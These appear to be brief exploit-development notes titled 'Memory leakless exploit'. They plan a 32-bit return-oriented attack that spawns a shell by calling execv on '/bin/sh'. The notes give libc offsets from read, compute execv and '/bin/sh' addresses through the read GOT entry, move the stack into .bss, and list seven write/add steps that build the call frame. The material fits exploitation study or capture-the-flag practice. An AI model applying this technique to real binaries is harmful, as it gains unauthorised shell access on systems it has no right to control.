Memory leakless exploit
=======================

We want to call an execv.

read_offset = 000e3e10
offset_execv_read = 000bd890 - read_offset
offset_binsh_read = 00166046 - read_offset

execv_address = *(read_got) + offset_execv_read
final_return = 0xdeadb00b
binsh_address = *(read_got) + offset_binsh_read
pointer_to_null = 08048008

new_stack = .bss + 1024

Steps of the attack:

1. int *new_stack = writable_position + exploit_size
2. writemem(new_stack--, pointer_to_null)
3. mem_to_mem(read_got, new_stack)
4. add(new_stack--, offset_binsh_read)
5. writemem(new_stack--, final_return)
6. mem_to_mem(read_got, new_stack)
7. add(new_stack--, offset_execv_read)
